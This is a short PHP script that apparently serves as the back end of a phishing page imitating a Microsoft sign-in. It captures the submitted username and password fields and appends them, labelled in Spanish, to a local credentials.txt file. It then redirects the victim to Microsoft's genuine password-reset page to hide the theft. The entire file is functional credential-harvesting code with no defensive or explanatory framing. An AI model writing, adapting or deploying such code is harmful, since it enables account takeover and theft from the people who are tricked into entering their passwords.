<?php

file_put_contents("credentials.txt", "[+] Microsoft -> Usuario: " . $_POST['loginfmt'] . " Contraseña: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://account.live.com/ResetPassword.aspx');
exit();
?>
